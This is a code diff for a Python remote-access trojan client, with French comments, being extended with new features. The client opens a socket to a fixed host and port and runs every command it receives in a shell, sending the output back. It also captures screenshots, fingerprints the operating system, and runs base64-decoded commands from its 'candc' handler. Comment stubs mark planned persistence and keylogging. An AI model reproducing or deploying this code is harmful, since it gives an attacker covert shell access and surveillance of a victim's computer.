@@ -1,36 +1,40 @@
 import subprocess
 import sys
 import os
-os.popen("sudo /usr/bin/pip3 install --upgrade typing")
+#os.popen("sudo /usr/bin/pip3 install --upgrade typing")
 try:
     import mss
 except ImportError:
-    sys.executable, "-m", "pip3", "install", 'mss'
+    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
+'mss'])
 finally:
     import mss
-
 try:
     import socket
 except ImportError:
-    sys.executable, "-m", "pip3", "install", 'socket'
+    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
+'socket'])
 finally:
     import socket as s
 try:
     import requests
 except ImportError:
-    sys.executable, "-m", "pip3", "install", 'requests'
+    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
+'requests'])
 finally:
     import requests
 try:
     import bs4
 except ImportError:
-    sys.executable, "-m", "pip3", "install", 'bs4'
+    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
+'bas4'])
 finally:
     from bs4 import BeautifulSoup as soup
 try:
     import base64
 except ImportError:
-    sys.executable, "-m", "pip3", "install", 'base64'
+    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
+'base64'])
 finally:
     import base64
 
@@ -40,6 +44,22 @@ finally:
 message = str()
 #### Client ######
 ##Attendre une connexion
+
+def detectos():
+    try:
+        detectcmd = "lsb_release -a"
+        resultDetectos = subprocess.Popen(detectcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    except:
+        pass
+    try:
+        dtectcmd = "systeminfo"
+        resultDetectos = subprocess.Popen(detectcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    except:
+        pass
+    return resultDetectos
+
+
+
 
 def screen():
     with mss() as sct :
@@ -57,24 +77,40 @@ def candc():
     payload = base64.b64decode(cmd)
     return payload
 
+#écrire dans le profile pour persistant
+#def persistant():
+
+
+
+## Keylogger
+
+
 mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
 
 
 ### Fonction connect((host,port)
 
-mon_socket.connect(("192.168.1.196",1242))
+mon_socket.connect(("192.168.1.196",1243))
 while message != "exit":
     message = mon_socket.recv(262144)
     message = message.decode('UTF-8')
-    if message == "screen":
+
+    if message == "os":
+        detectosDef = detectos()
+        mon_socket.send(detectosDef.stdout.read()+detectosDef.stderr.read())
+
+    elif message == "screen":
         mon_socket.send(screen())
-    if message == "candc":
+    elif message == "candc":
         payloadcmd = candc()
         process = subprocess.Popen(payloadcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         mon_socket.send(process.stdout.read()+process.stderr.read())
 
+    #if message = "persistant":
+
+
     else:
-        print(message)
+        #print(message)
         process = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         mon_socket.send(process.stdout.read()+process.stderr.read())
 
